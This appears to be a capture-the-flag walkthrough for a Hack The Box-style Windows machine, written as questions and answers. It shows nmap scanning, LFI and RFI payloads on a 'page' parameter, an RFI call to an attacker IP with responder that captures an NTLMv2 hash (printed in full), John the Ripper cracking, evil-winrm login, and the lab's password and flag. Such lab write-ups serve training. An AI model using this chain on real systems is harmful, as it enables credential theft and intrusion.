how many TCP ports are open on the machine
nmap -sC -sV -sS -oN scanned IP__ -T5
ada 2 :
80/tcp open http apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

when visiting web service, what is the domain we redirected to
unika.htb

which scripting lang is being used on the server to generate webpages
php

to run this website on our local machine, we need to add the ip into
the /etc/hosts file
sudo nano /etc/hosts
*add this between 127.0.1.1 hostname and desireable IPv6 hosts*
"""
# HTB
IP__
"""

what is name of URL parameter which is used to load different lang
version of the webpage
page

which of the following val for the 'page' parameter would be an 
example of exploiting a Local File Include (LFI) vuln :
- "french.html"
- "//10.10.14.6/somefile"
- "../../../../../../../../windows/system32/drivers/etc/hosts"
- "minikatz.exe"
answer : "../../../../../../../../windows/system32/drivers/etc/hosts"

which of the following val for the page parameter would be an
example of exploiting a Remote File Include (RFI) vuln :
- "french.html"
- "//10.10.14.6/somefile"
- "../../../../../../../../windows/system32/drivers/etc/hosts"
- "minikatz.exe"
answer : "//10.10.14.6/somefile"

what does NTLM stand for
New Technology LAN Manager

flag to specifies the interface when using responder
-I

tools for cracking password
John the Ripper

use responder to get the hash administrator
> responder -I tun0
then modify the url in web
http://unika.htb/index.php?page=//10.10.16.33/wtf
in terminal we would get the hash like this
"Administrator::RESPONDER:1b9b0b1e4a69fae8:36352B6CD1265EBDD4121D9326A5F4CB:0101000000000000000C1EC9789BD801B43952A3A6F587C10000000002000800490034004D00580001001E00570049004E002D0057004C0041004E0048005400430042004C004B00580004003400570049004E002D0057004C0041004E0048005400430042004C004B0058002E00490034004D0058002E004C004F00430041004C0003001400490034004D0058002E004C004F00430041004C0005001400490034004D0058002E004C004F00430041004C0007000800000C1EC9789BD80106000400020000000800300030000000000000000100000000200000FDBD885975E675CC1990EAE37FA8FD5BD8EC105B238CE91BC3D4146E03E3C4DD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330033000000000000000000"
echo that to some file
crack the password using jtr
> john -w=/usr/share/wordlists/rockyou.txt file.txt
then we get the passwd

what is the passwd for administrator user
badminton

what port winrm is running
5985

to get the root flag, use the evil-winrm
> evil-winrm -p password -u user -i IP__

here's the flag ea81b7afddd03efaa0945333ed147fac
